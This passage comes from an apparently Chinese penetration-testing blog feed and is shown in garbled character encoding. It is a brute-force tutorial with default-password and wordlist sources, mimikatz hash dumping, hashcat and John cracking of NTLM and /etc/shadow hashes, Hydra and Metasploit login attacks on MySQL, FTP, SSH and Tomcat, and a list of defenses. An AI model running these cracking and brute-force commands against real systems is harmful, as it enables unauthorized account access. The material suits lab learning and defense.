·ä¹Ÿè®¸å¯ä»¥èŠ‚çº¦å¤§é‡çš„æ—¶é—´å’Œå·¥ä½œé‡ã€‚é€šè¿‡æœç´¢å¼•æ“ç­‰æ–¹å¼å¯ä»¥è·å–åˆ°ä¸åŒæœåŠ¡çš„é»˜è®¤å£ä»¤ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›é»˜è®¤å£ä»¤çš„åˆé›†ã€‚</p><ul><li><a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm%E2%80%98">http://www.vulnerabilityassessment.co.uk/passwordsC.htmâ€˜</a></li><li><a href="https://192-168-1-1ip.mobi/default-router-passwords-list/">https://192-168-1-1ip.mobi/default-router-passwords-list/</a></li><li><a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li><li><a href="https://bizuns.com/default-passwords-list">https://bizuns.com/default-passwords-list</a></li><li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv</a></li><li><a href="https://www.cirt.net/passwords">https://www.cirt.net/passwords</a></li><li><a href="https://www.passwordsdatabase.com/">https://www.passwordsdatabase.com/</a></li></ul><p>é€šè¿‡å¯¹è¿™äº›é»˜è®¤å£ä»¤çš„åˆ†æä¸éš¾å‘ç°ï¼Œå¾ˆå¤šéƒ½æ˜¯ä»¥<code>admin</code>ã€<code>root</code>ã€<code>administrator</code>ã€<code>password</code>ç­‰å­—æ ·å‡ºç°ï¼Œè€Œå¦‚æœä¸æ›´æ”¹æ‰é»˜è®¤å£ä»¤ï¼Œæ”»å‡»è€…å¾€å¾€å°±èƒ½ä»¥æ­¤è½»æ¾çªç ´ã€‚</p><p>ï¼ˆ2ï¼‰<strong>å¥½ç”¨çš„å­—å…¸</strong></p><p>çˆ†ç ´çš„å­—å…¸é€‰ä»€ä¹ˆæ˜¯ä¸€ä¸ªæŠ€å·§ï¼Œå¹¶éè¶Šå…¨è¶Šå¥½ï¼Œè¿™é‡Œæ•´ç†äº†ä¸€äº›å¥½ç”¨çš„å­—å…¸ä»“åº“ï¼ˆæ„Ÿè°¢ä¼—å¤§ä½¬çš„åˆ†äº«ï¼‰ï¼Œä»…ä¾›å‚è€ƒã€‚</p><ul><li><a href="https://github.com/Dormidera/WordList-Compendium">https://github.com/Dormidera/WordList-Compendium</a></li><li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li><li><a href="https://github.com/3had0w/Fuzzing-Dicts">https://github.com/3had0w/Fuzzing-Dicts</a></li></ul><p>ï¼ˆ3ï¼‰<strong>è‡ªå®šä¹‰å­—å…¸</strong></p><p>å¦‚æœå‰æœŸå·²ç»é€šè¿‡ç¤¾å·¥ç­‰æ–¹å¼æœé›†åˆ°ç›®æ ‡æœ‰å…³ä¿¡æ¯ï¼Œä¹Ÿè®¸æ ¹æ®ç›®æ ‡ç”Ÿæˆçš„ä¸“å±å­—å…¸èƒ½å¢åŠ ç ´è§£æ•ˆç‡ã€‚</p><p>ä½¿ç”¨åˆ°çš„å·¥å…·ï¼š<a href="https://github.com/LandGrey/pydictor">pydictor</a>â€”â€” ä¸€ä¸ªå¼ºå¤§å®ç”¨çš„é»‘å®¢æš´åŠ›ç ´è§£å­—å…¸å»ºç«‹å·¥å…·</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717140826872.png" alt="image-20210717140826872"></p><p>è¯¦ç»†ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒå…¶<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">ç”¨æ³•ç¤ºä¾‹</a></p><h2 id="2-å¯†ç ç ´è§£"><a href="#2-å¯†ç ç ´è§£" class="headerlink" title="2.å¯†ç ç ´è§£"></a>2.å¯†ç ç ´è§£</h2><p>åœ¨é€šè¿‡ä¸€å®šæ–¹å¼è·å¾—å¯†ç å“ˆå¸Œåï¼Œè¿›ä¸€æ­¥è¦åšçš„å°±æ˜¯å°†å…¶ç ´è§£äº†ã€‚</p><blockquote><p>ä½•ä¸ºhashï¼ŸHash ä¸€èˆ¬ç¿»è¯‘ä¸ºâ€œæ•£åˆ—â€ï¼Œä¹Ÿå¯ç›´æ¥éŸ³è¯‘ä¸ºâ€œå“ˆå¸Œâ€çš„ã€‚è¿™ä¸ªåŠ å¯†å‡½æ•°å¯¹ä¸€ä¸ªä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†å‡½æ•°è¿ç®—ï¼Œç„¶åè¿”å›ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ã€‚Hash ä¸»è¦ç”¨äºä¿¡æ¯å®‰å…¨é¢†åŸŸä¸­åŠ å¯†ç®—æ³•ï¼Œæ¸—é€æµ‹è¯•ä¸­è·å–ç›®æ ‡ç³»ç»Ÿçš„æ˜æ–‡æˆ– Hash å¾€å¾€æ˜¯æ•´ä¸ªæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­é‡è¦çš„ä¸€ç¯ã€‚</p></blockquote><h3 id="Window-Hash"><a href="#Window-Hash" class="headerlink" title="Window Hash"></a>Window Hash</h3><p>åœ¨ Windows ç³»ç»Ÿä¸­æœ¬æœºç”¨æˆ·çš„å¯†ç  Hash æ˜¯æ”¾åœ¨æœ¬åœ°çš„ SAM(Security Account Manager) æ–‡ä»¶é‡Œé¢ï¼ŒåŸŸå†…ç”¨æˆ·çš„å¯†ç  Hashæ˜¯å­˜åœ¨åŸŸæ§çš„ NTDS.DIT æ–‡ä»¶é‡Œé¢ã€‚</p><p>åˆ†ç±»</p><ol><li><p>LM</p><p>LAN Managerï¼ˆLMï¼‰å“ˆå¸Œæ˜¯ Windows ç³»ç»Ÿæ‰€ç”¨çš„ç¬¬ä¸€ç§å¯†ç å“ˆå¸Œç®—æ³•ï¼Œæ˜¯ä¸€ç§è¾ƒå¤è€çš„ Hashï¼Œåœ¨ LAN Manageråè®®ä¸­ä½¿ç”¨ï¼Œéå¸¸å®¹æ˜“é€šè¿‡æš´åŠ›ç ´è§£è·å–æ˜æ–‡å‡­æ®ã€‚å®ƒåªæœ‰å”¯ä¸€ä¸€ä¸ªç‰ˆæœ¬ä¸”ä¸€ç›´ç”¨åˆ°äº† NT LAN Managerï¼ˆNTLMï¼‰å“ˆå¸Œçš„å‡ºç°ï¼Œåœ¨ Windows Vista/Windows 7/Windows Server 2008 ä»¥åŠåé¢çš„ç³»ç»Ÿä¸­ï¼ŒLMå“ˆå¸Œç®—æ³•æ˜¯é»˜è®¤å…³é—­çš„ï¼ŒLM ç®—æ³•æ˜¯åœ¨ DES åŸºç¡€ä¸Šå®ç°çš„ï¼Œä¸åŒºåˆ†å­—æ¯å¤§å°å†™ã€‚</p></li><li><p>NTLM</p><p>NT LAN Managerï¼ˆNTLMï¼‰å“ˆå¸Œæ˜¯Windowsç³»ç»Ÿè®¤å¯çš„å¦ä¸€ç§ç®—æ³•ï¼Œç”¨äºæ›¿ä»£å¤è€çš„ LM-Hashï¼Œä¸€èˆ¬æŒ‡ Windows ç³»ç»Ÿä¸‹ Security Account Managerï¼ˆSAMï¼‰ä¸­ä¿å­˜çš„ç”¨æˆ·å¯†ç  Hashï¼Œåœ¨ Windows Vista/Windows 7/Windows Server 2008 ä»¥åŠåé¢çš„ç³»ç»Ÿä¸­ï¼ŒNTLM å“ˆå¸Œç®—æ³•æ˜¯é»˜è®¤å¯ç”¨çš„ã€‚</p></li></ol><p>è·å–</p><p>Hashçš„è·å–å¯ä»¥ä½¿ç”¨mimikatzå·¥å…·</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>ä¸‹å›¾ä¸ºä½¿ç”¨mimikatzè·å–win10ç”¨æˆ·çš„å¯†ç Hash</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717142402993.png" alt="image-20210717142402993"></p><p><strong>Hashcat ç ´è§£</strong></p><p>åœ¨æ‹¿åˆ° LM æˆ–è€… NTLM çš„å¯†æ–‡æ—¶ï¼Œå¦‚æœæ²¡æœ‰æ˜æ–‡çš„æ—¶å€™ï¼Œæœ€ç›´æ¥çš„æ–¹æ³•å½“ç„¶æ˜¯ç›´æ¥å°†å…¶è§£å¯†å•¦ï¼Œè¿™é‡Œä½¿ç”¨Hashcatæ¥è¿›è¡Œå¯†ç è§£å¯†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715154154916.png" alt="image-20210715154154916"></p><p>å¦‚ä¸Šå›¾æˆ‘ä»¬é€šè¿‡msfè·å–åˆ°ç›®æ ‡ä¸»æœºçš„hash</p><blockquote><p>LMï¼š44efce164ab921caaad3b435b51404ee</p><p>NTLMï¼š32ed87bdb5fdc5e9cba88547376818d4</p><p>SHA1ï¼š6ed5833cf35286ebf8662b7b5949f0d742bbec3f</p></blockquote><p>å®é™…æ˜æ–‡ä¸ºï¼š123456</p><p>Hashcatç ´è§£è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 1000 --force 32ed87bdb5fdc5e9cba88547376818d4 password.txt</span><br></pre></td></tr></table></figure><p><code>-a 0</code> å­—å…¸ç ´è§£</p><p>hashcat â€“-help å¯ä»¥çœ‹åˆ° LM å’Œ NTLM å¯¹åº”çš„ hash ç¼–å·åˆ†åˆ«ä¸º<code>3000</code>å’Œ<code>1000</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715160322263.png" alt="image-20210715160322263"></p><p><strong>åœ¨çº¿Hashç ´è§£</strong></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715160549150.png" alt="image-20210715160549150"></p><p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210716100314103.png" alt="image-20210716100314103"></p><h3 id="Linux-Hash"><a href="#Linux-Hash" class="headerlink" title="Linux Hash"></a>Linux Hash</h3><p>å»ºç«‹ä¸€ä¸ªtestç”¨æˆ·è¿›è¡Œæµ‹è¯•ï¼Œå¯†ç test</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -m test</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><p>Linux å¯†ç ä¿¡æ¯ä¿å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«ä¸ºï¼š <code>/etc/passwd</code> å’Œ <code>/etc/shadow</code></p><p><strong>/etc/passwd</strong></p><p>æ™®é€šç”¨æˆ·æƒé™èƒ½å¤ŸæŸ¥çœ‹</p><p>ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯ä¸€è¡Œé€šè¿‡å†’å·ï¼šåˆ†ä¸ºä¸ƒä¸ªéƒ¨åˆ†</p><ol><li>ç”¨æˆ·å</li><li>å¯†ç ï¼Œx è¡¨ç¤ºå¯†ç ä¿å­˜åœ¨ <code>/etc/shadow</code></li><li>UIDï¼Œ0 ä»£è¡¨ root</li><li>GIDï¼Œè¡¨ç¤ºæ‰€åœ¨ç»„</li><li>æè¿°ä¿¡æ¯ï¼Œä¾æ¬¡ä¸º Full Nameã€Room Numberã€Work Phoneã€Home Phone å’Œ Other</li><li>ç”¨æˆ·ä¸»ç›®å½•</li><li>é»˜è®¤ shell ç±»å‹</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tail -n 1 /etc/passwd</span>              </span><br><span class="line">test:x:1001:1001::/home/test:/bin/sh</span><br></pre></td></tr></table></figure><p><strong>/etc/shadow</strong></p><p>åªæœ‰ root ç”¨æˆ·æƒé™èƒ½å¤ŸæŸ¥çœ‹</p><p>ä¿å­˜åŠ å¯†åçš„å¯†ç å’Œç”¨æˆ·çš„ç›¸å…³å¯†ç ä¿¡æ¯ï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯ä¸€è¡Œé€šè¿‡å†’å·ï¼šåˆ†ä¸ºä¹ä¸ªéƒ¨åˆ†</p><ol><li>ç”¨æˆ·å</li><li>åŠ å¯†åçš„å¯†ç </li><li>ä¸Šæ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´ (ä» 1970.1.1 å¼€å§‹çš„æ€»å¤©æ•°)</li><li>ä¸¤æ¬¡ä¿®æ”¹å¯†ç é—´éš”çš„æœ€å°‘å¤©æ•°ï¼Œå¦‚æœä¸º 0ï¼Œåˆ™æ²¡æœ‰é™åˆ¶</li><li>ä¸¤æ¬¡ä¿®æ”¹å¯†ç é—´éš”æœ€å¤šçš„å¤©æ•°, è¡¨ç¤ºè¯¥ç”¨æˆ·çš„å¯†ç ä¼šåœ¨å¤šå°‘å¤©åè¿‡æœŸï¼Œå¦‚æœä¸º 99999 åˆ™æ²¡æœ‰é™åˆ¶</li><li>æå‰å¤šå°‘å¤©è­¦å‘Šç”¨æˆ·å¯†ç å°†è¿‡æœŸ</li><li>åœ¨å¯†ç è¿‡æœŸä¹‹åå¤šå°‘å¤©ç¦ç”¨æ­¤ç”¨æˆ·</li><li>ç”¨æˆ·è¿‡æœŸæ—¥æœŸ (ä» 1970.1.1 å¼€å§‹çš„æ€»å¤©æ•°)ï¼Œå¦‚æœä¸º 0ï¼Œåˆ™è¯¥ç”¨æˆ·æ°¸ä¹…å¯ç”¨</li><li>ä¿ç•™</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tail -n 1 /etc/shadow</span></span><br><span class="line">test:$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e/:18825:0:99999:7:::</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ul><li>å¯†ç å­—ç¬¦ä¸²ä¸º*ï¼Œè¡¨ç¤ºç³»ç»Ÿç”¨æˆ·ä¸èƒ½è¢«ç™»å…¥</li><li>å¯†ç å­—ç¬¦ä¸²ä¸º!ï¼Œè¡¨ç¤ºç”¨æˆ·åè¢«ç¦ç”¨ï¼Œå¯ä»¥åœ¨æœºå™¨ä¸Šè½¬åˆ°è¯¥ç”¨æˆ·ï¼Œä½†æ— æ³•è¿œç¨‹ç™»å½•</li><li>å¯†ç å­—ç¬¦ä¸²ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰å¯†ç </li></ul><p>å¯†æ–‡ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>$id$salt$encrypted</code>ï¼Œidè¡¨ç¤ºåŠ å¯†ç®—æ³•ï¼Œsalt è¡¨ç¤ºå¯†ç å­¦ä¸­çš„ Salt, ç³»ç»Ÿéšæœºç”Ÿæˆ encrypted è¡¨ç¤ºå¯†ç çš„ hash</p><ul><li>DESå’Œæ˜æ–‡å¼€å¤´æ— æ ‡è®°</li><li>idä¸º1æ—¶ï¼Œé‡‡ç”¨md5è¿›è¡ŒåŠ å¯†ï¼›</li><li>idä¸º5æ—¶ï¼Œé‡‡ç”¨SHA256è¿›è¡ŒåŠ å¯†ï¼›</li><li>idä¸º6æ—¶ï¼Œé‡‡ç”¨SHA512è¿›è¡ŒåŠ å¯†ã€‚</li></ul><p><strong>ç ´è§£Hash</strong></p><p>æ–¹å¼ä¸€ï¼š<strong>John the Ripper</strong></p><p>è¿™é‡Œä½¿ç”¨kaliè‡ªå¸¦çš„Johnå·¥å…·è¿›è¡Œç ´è§£</p><p>ä½¿ç”¨å­—å…¸ç ´è§£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/john/password.lst /etc/shadow</span><br></pre></td></tr></table></figure><p>æˆ–ç›´æ¥æš´åŠ›ç ´è§£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john /etc/shadow</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717154253923.png" alt="image-20210717154253923"></p><p><strong>æ–¹å¼äºŒï¼šHashcat</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -o found1.txt /etc/shadow /usr/share/john/password.lst </span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><p>-m 1800ï¼šhash-typeï¼Œ1800å¯¹åº”SHA512</p><p>-o found1.txtï¼šç ´è§£ç»“æœè¾“å‡ºåˆ°found1.txtä¸­</p><p>/etc/shadowï¼šå«è¦ç ´è§£å¯†æ–‡çš„æ–‡ä»¶</p><p>/usr/share/john/password.lstï¼šå­—å…¸æ–‡ä»¶</p><p>ç»“æœå¦‚å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717160033067.png" alt="image-20210717160033067"></p><h2 id="3-å¯†ç å–·æ´’"><a href="#3-å¯†ç å–·æ´’" class="headerlink" title="3.å¯†ç å–·æ´’"></a>3.å¯†ç å–·æ´’</h2><p><strong>Mysqlçˆ†ç ´</strong></p><p>ä½¿ç”¨å·¥å…·â€“Kali-Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.100.250 -l wyw -P password.txt mysql -V</span><br><span class="line">#hydra IPåœ°å€ -l å•ä¸ªè´¦æˆ·å -P å­—å…¸è·¯å¾„ æœåŠ¡å -V</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715162708548.png" alt="image-20210715162708548"></p><p>ä½¿ç”¨å·¥å…·â€“Kali-Metasploit</p><pre><code>  â‘ ï¼šuse auxiliary/scanner/mysql/mysql_login   â‘¡ï¼šshow options  â‘¢ï¼šset RHOSTS IPåœ°å€  â‘£ï¼šset USERNAME å•ä¸ªè´¦æˆ·  â‘¤ï¼šset PASS_FILE å­—å…¸è·¯å¾„åœ°å€  â‘¥ï¼šset RPORT ç«¯å£å·  â‘¦ï¼šrun</code></pre><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715164750258.png" alt="image-20210715164750258"></p><p>é‡åˆ°çš„å‘ï¼š</p><ol><li><p>3306ç«¯å£éœ€å¯¹å¤–å¼€æ”¾</p></li><li><p>mysqlç”¨æˆ·å…è®¸è¿œç¨‹è¿æ¥æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure></li><li><p>è‹¥å‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œéœ€ä¿®æ”¹mysqlå­—ç¬¦é›†</p></li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715165113384.png" alt="image-20210715165113384"></p><p>ä¿®æ”¹<code>my.ini</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character-set-server&#x3D;utf8</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼ŒFTPã€SSHã€Tomcatç­‰ä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤å·¥å…·çˆ†ç ´ã€‚</p><ul><li>FTP</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login</span><br></pre></td></tr></table></figure><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.146.141 -l admin -P &#x2F;top1500.txt ftp -V</span><br></pre></td></tr></table></figure><ul><li>SSH</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</span><br></pre></td></tr></table></figure><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.146.141 -l root -P &#x2F;top1500.txt ssh -V</span><br></pre></td></tr></table></figure><ul><li>Tomcat</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_mgr_login</span><br></pre></td></tr></table></figure><h1 id="0x03-å…¶ä»–åœºæ™¯"><a href="#0x03-å…¶ä»–åœºæ™¯" class="headerlink" title="0x03 å…¶ä»–åœºæ™¯"></a>0x03 å…¶ä»–åœºæ™¯</h1><p>å‰é¢æè¿°äº†é’ˆå¯¹ç™»å½•ç”¨æˆ·å’Œå¯†ç çš„æš´åŠ›ç ´è§£ï¼Œæš´åŠ›ç ´è§£æ˜¯å¦è¿˜å¯ä»¥ç”¨åœ¨å…¶ä»–åœºæ™¯å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå› ä¸ºæ¶‰åŠäººæœºäº¤äº’çš„å†…å®¹æœ¬è´¨è¿˜æ˜¯ä¸€ä¸ªé¢˜ç›®éªŒè¯åœºæ™¯ï¼Œåœ¨ä»¥ä¸‹è¿™äº›åœºæ™¯ä¸­ï¼Œä¹Ÿæœ‰å¯èƒ½é­é‡åˆ°æš´åŠ›ç ´è§£æ”»å‡»ã€‚</p><p><strong>å›¾å½¢éªŒè¯ç </strong>â€“åŒæ ·çš„ä½¿ç”¨ç©·ä¸¾æ–¹æ³•ï¼Œå‡è®¾Webåº”ç”¨çš„ç™»å½•éªŒè¯ç çš„èŒƒå›´æ˜¯ä¸€ä¸ªå¯è¡¡é‡çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å·¥å…·å°†æ‰€æœ‰çš„éªŒè¯ç é—®é¢˜è¯·æ±‚åŠç»“æœä¿å­˜ä¸ºåˆé›†ï¼Œå¹¶åœ¨åç»­çš„ç ´è§£è¿‡ç¨‹ä¸­è°ƒç”¨è¿™ä¸ªç»“æœåˆé›†ï¼›</p><p><strong>çŸ­ä¿¡/é‚®ç®±éªŒè¯ç </strong>â€“é’ˆå¯¹å››åˆ°å…­ä½çº¯æ•°å­—çš„çŸ­ä¿¡æˆ–é‚®ç®±éªŒè¯ç ï¼Œä¹Ÿå¯ä»¥ç”¨æš´åŠ›ç ´è§£çš„æ–¹æ³•è¿›è¡ŒçŒœè§£æ”»å‡»å°è¯•ï¼›</p><p><strong>å…³é”®å‚æ•°</strong>â€“é’ˆå¯¹åº”ç”¨ä¸­çš„å…³é”®å‚æ•°çš„ï¼Œäº¦å¯ä»¥ç”¨ç©·ä¸¾æ³•è¿›è¡Œéå†ï¼Œå½“å­˜åœ¨æƒé™æ§åˆ¶ä¸å½“æ—¶ï¼Œè¿™ç§éå†æ–¹æ³•è¿˜èƒ½æ‰¹é‡è·å–æ•æ„Ÿä¿¡æ¯ã€‚å¦‚æšä¸¾è®¢å•å·åå¹¶æäº¤è®¢å•æŸ¥è¯¢ï¼Œåœ¨æƒé™æ§åˆ¶ä¸å½“çš„Webåº”ç”¨ä¸­ï¼Œè¿™ä¼šå¯¼è‡´æ‰¹é‡çš„ç”¨æˆ·è®¢å•ä¿¡æ¯æ³„éœ²ã€‚</p><h1 id="0x04-é˜²å¾¡æ–¹æ³•"><a href="#0x04-é˜²å¾¡æ–¹æ³•" class="headerlink" title="0x04 é˜²å¾¡æ–¹æ³•"></a>0x04 é˜²å¾¡æ–¹æ³•</h1><p>é’ˆå¯¹æš´åŠ›ç ´è§£æ”»å‡»ï¼Œåº”ç”¨çš„å®‰å…¨è®¾è®¡è¦å¤šæ–¹è€ƒé‡ï¼Œä»æ¯ä¸€ä¸ªå¯èƒ½çš„å—æ”»å‡»é¢å‡ºå‘ï¼Œç»“åˆé€†å‘çš„é€»è¾‘æ€è·¯ï¼Œå»ºç«‹åˆç†çš„é˜²å¾¡æœºåˆ¶ã€‚å¸¸è§çš„é˜²å¾¡æªæ–½å¦‚ä¸‹ã€‚</p><p>1)ç”¨æˆ·åæˆ–å¯†ç è¾“å…¥é”™è¯¯æ—¶ç»Ÿä¸€è¿”å›â€œç™»å½•é”™è¯¯ï¼Œè¯·é‡è¯•â€æç¤ºä¿¡æ¯</p><p>2)åœ¨ç”¨æˆ·ç™»å½•æ—¶å¢åŠ éªŒè¯ç ï¼Œé˜²æ­¢é€šè¿‡ç¨‹åºè‡ªåŠ¨æšä¸¾è´¦æˆ·</p><p>3)éªŒè¯ç åº”å…·æœ‰è¶³å¤Ÿçš„éšæœºæ€§å’Œå¹²æ‰°æ€§ï¼Œè€ƒè™‘é€»è¾‘å’Œäº¤äº’å¼éªŒè¯ç </p><p>4)ç¡®ä¿æ‰€æœ‰ç±»å‹çš„éªŒè¯ç èƒ½å¤Ÿç”¨åå³å¤±æ•ˆï¼Œé˜²èŒƒå¯è¢«é‡ç”¨</p><p>5)åœ¨ç”¨æˆ·ç™»å½•ä¸­å¢åŠ å¯¹åŒä¸€IPåœ°å€å°è¯•æ¬¡æ•°çš„é™åˆ¶</p><p>6)ç³»ç»Ÿè‡ªèº«å®‰å…¨æ€§å¢å¼ºï¼šå¼ºåˆ¶è¦æ±‚ç”¨æˆ·æ³¨å†Œæ—¶æ»¡è¶³å£ä»¤å¤æ‚åº¦è¦æ±‚</p><p>7)å®šæœŸå¯¹æ¯”æ•°æ®åº“å­˜å‚¨çš„å¯†ç å¯†æ–‡å€¼ä¸top500å¼±å¯†ç çš„å¯†æ–‡å€¼</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/Home_pig/article/details/83722076">æš´åŠ›ç ´è§£</a></p><p>[2] <a href="https://www.sqlsec.com/2019/11/winhash.html">Windows ç”¨æˆ·å¯†ç çš„åŠ å¯†æ–¹æ³•ä¸ç ´è§£</a></p><p>[3] <a href="https://blog.csdn.net/zhang14916/article/details/86539098?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242">webæ¸—é€â€”æš´åŠ›ç ´è§£</a></p><p>[4] <a href="https://www.sohu.com/a/303862550_534345">ã€æŠ€æœ¯å·¥åœºã€‘æµ…è°ˆæš´åŠ›ç ´è§£æ”»å‡»</a> </p><p>[5] <a href="https://zhuanlan.zhihu.com/p/149825451">æš´åŠ›ç ´è§£æ–¹æ³•æ±‡æ€»â€”â€”è¿œç¨‹æœåŠ¡çˆ†ç ´ç¯‡</a></p><p>[6] <a href="https://blog.csdn.net/zsj2102/article/details/81166534">Linux ä¸‹çš„å¯†ç  Hashç ´è§£æ–¹æ³•</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åˆæ¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»å¼ºç½‘æ¯2021çº¿ä¸Šèµ›ä¹ å¾—</title>
      <link href="posts/23985.html"/>
      <url>posts/23985.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>å¼ºç½‘æ¯çš„é¢˜ç›®è´¨é‡å°±æ˜¯é«˜ï¼Œå¥ˆä½•æ²¡å‡ ä¸ªæˆ‘ä¼šåšçš„ğŸ˜£ï¼ˆè¿˜æ˜¯å¤ªèœï¼‰</p><p>ä»¥ä¸‹å¯¹ä»è¿™æ¬¡æ¯”èµ›æ‰€å­¦ä¹ åˆ°çš„å¹²è´§ï¼ˆä¸»è¦æ˜¯webæ–¹é¢ï¼‰è¿›è¡Œè®°å½•ã€‚</p><h1 id="0x01-pop-master"><a href="#0x01-pop-master" class="headerlink" title="0x01 pop_master"></a>0x01 pop_master</h1><p>index.php ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//class.php.txt</span></span><br><span class="line">highlight_file(<span 